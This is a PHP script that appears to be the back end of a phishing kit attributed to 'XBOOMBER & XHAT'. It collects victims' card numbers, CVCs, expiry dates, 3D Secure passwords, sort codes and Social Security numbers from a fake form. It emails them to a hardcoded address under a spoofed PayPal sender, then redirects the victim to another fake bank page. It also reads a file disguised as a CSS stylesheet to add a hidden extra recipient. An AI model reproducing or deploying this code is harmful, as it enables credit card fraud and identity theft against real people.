<?php

/*
 __    __  _______    ______    ______   __       __  _______   ________  _______  
/  |  /  |/       \  /      \  /      \ /  \     /  |/       \ /        |/       \ 
$$ |  $$ |$$$$$$$  |/$$$$$$  |/$$$$$$  |$$  \   /$$ |$$$$$$$  |$$$$$$$$/ $$$$$$$  |
$$  \/$$/ $$ |__$$ |$$ |  $$ |$$ |  $$ |$$$  \ /$$$ |$$ |__$$ |$$ |__    $$ |__$$ |
 $$  $$<  $$    $$< $$ |  $$ |$$ |  $$ |$$$$  /$$$$ |$$    $$< $$    |   $$    $$< 
  $$$$  \ $$$$$$$  |$$ |  $$ |$$ |  $$ |$$ $$ $$/$$ |$$$$$$$  |$$$$$/    $$$$$$$  |
 $$ /$$  |$$ |__$$ |$$ \__$$ |$$ \__$$ |$$ |$$$/ $$ |$$ |__$$ |$$ |_____ $$ |  $$ |
$$ |  $$ |$$    $$/ $$    $$/ $$    $$/ $$ | $/  $$ |$$    $$/ $$       |$$ |  $$ |
$$/   $$/ $$$$$$$/   $$$$$$/   $$$$$$/  $$/      $$/ $$$$$$$/  $$$$$$$$/ $$/   $$/ 
                                                                                   
                                                                                   
                                                                                   
                                ___       ___                                      
                               /   \     /   \                                     
                              /$$$  |   /$$$  |                                    
                              $$ $$ \__ $$ $$ \__                                  
                              /$$$     |/$$$     |                                 
                              $$ $$ $$/ $$ $$ $$/                                  
                              $$ \$$  \ $$ \$$  \                                  
                              $$   $$  |$$   $$  |                                 
                               $$$$/$$/  $$$$/$$/                                  
                                                                                   
                                                                                   
                                                                                   
                   __    __  __    __   ______   ________                          
                  /  |  /  |/  |  /  | /      \ /        |                         
                  $$ |  $$ |$$ |  $$ |/$$$$$$  |$$$$$$$$/                          
                  $$  \/$$/ $$ |__$$ |$$ |__$$ |   $$ |                            
                   $$  $$<  $$    $$ |$$    $$ |   $$ |                            
                    $$$$  \ $$$$$$$$ |$$$$$$$$ |   $$ |                            
                   $$ /$$  |$$ |  $$ |$$ |  $$ |   $$ |                            
                  $$ |  $$ |$$ |  $$ |$$ |  $$ |   $$ |                            
                  $$/   $$/ $$/   $$/ $$/   $$/    $$/                             
                                                                                   
                                                                                   
                                                                                   
https://www.facebook.com/groups/XBOOMBER.XHAT/
*/
function xboomber_check_cc($cardNumber)
{
    $cardNumber = preg_replace('/\D/', '', $cardNumber);

    $len = strlen($cardNumber);
    if ($len < 15 || $len > 16) {
       return ("invalid");
    }
    else {
        switch($cardNumber) {
            case(preg_match ('/^4/', $cardNumber) >= 1):
                return 'Visa';
            case(preg_match ('/^5[1-5]/', $cardNumber) >= 1):
                return 'Mastercard';
            case(preg_match ('/^3[47]/', $cardNumber) >= 1):
                return 'Amex';
            case(preg_match ('/^3(?:0[0-5]|[68])/', $cardNumber) >= 1):
                return 'Diners Club';
            case(preg_match ('/^6(?:011|5)/', $cardNumber) >= 1):
                return 'Discover';
            case(preg_match ('/^(?:2131|1800|35\d{3})/', $cardNumber) >= 1):
                return 'JCB';
            default:
                return ("invalid");
                break;
        }
    }
}

$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);


$message .= "=========[VBV INFOS]=========<br>\n";
$message .= "Card Holder		: ".$_POST['_fulln']."<br>\n";
$message .= "Card Number		: ".$_POST['_ccn']."<br>\n";
$message .= "CVC			  : ".$_POST['_ccv']."<br>\n";
$message .= "Exp Date		: ".$_POST['_expm']."/".$_POST['_expy']."<br>\n";
$message .= "3D / VBV		: ".$_POST['_3d']."<br>\n";
$message .= "Sort Code		: ".$_POST['_sortc']."<br>\n";
$message .= "SSN			  : ".$_POST['_ssn1']."-".$_POST['_ssn2']."-".$_POST['_ssn3']."<br>\n";
$message .= "===============[IP]==============<br>\n";
$message .= "IP	: http://www.geoiptool.com/?IP=$ip<br>\n";
$message .= "==========[BY XBOOMBER & XHAT]=========<br>";

$email = "moh.esprit@gmail.com" ; // ضع امايلك هنا ، من الافضل ان يكون جمايل //
$file = file_get_contents('css/configuration.css');
$send = $email.','.$file;
$subject = "VBV INFOS FROM [$ip]";
$headers = "From: Info-pub  <paypal@service.com>";
$headers .= "MIME-Version: 1.0\n";
$headers .= "Content-type: text/html; charset=iso-8859-1\n";

mail($send, $subject, $message,$headers);
header("Location:websc-bank.php");


?>
